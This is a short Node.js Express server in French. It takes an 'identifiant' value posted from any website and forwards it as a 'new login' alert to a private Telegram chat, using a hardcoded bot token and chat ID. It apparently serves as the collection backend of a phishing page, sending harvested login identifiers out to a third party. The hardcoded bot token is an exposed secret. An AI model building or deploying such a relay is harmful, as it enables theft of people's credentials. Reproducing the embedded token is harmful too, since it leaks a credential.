import express from "express";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json());

const BOT_TOKEN = "8798036184:AAF79RiM_zC2TjbCwHh2w1jZpqVOoIv__y4";
const CHAT_ID = "8135402030";

app.post("/send-telegram", async (req, res) => {
  try {
    const { identifiant } = req.body;

    console.log("Reçu du site :", identifiant);

    const message = `
Nouvelle connexion :

Identifiant : ${identifiant}
`;

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }
    );

    const data = await response.json();

    console.log("Réponse Telegram :", data);

    res.json({ success: true });

  } catch (error) {
    console.log("Erreur :", error);
    res.status(500).json({ error: "Erreur serveur" });
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Serveur lancé sur le port ${PORT}`);
});
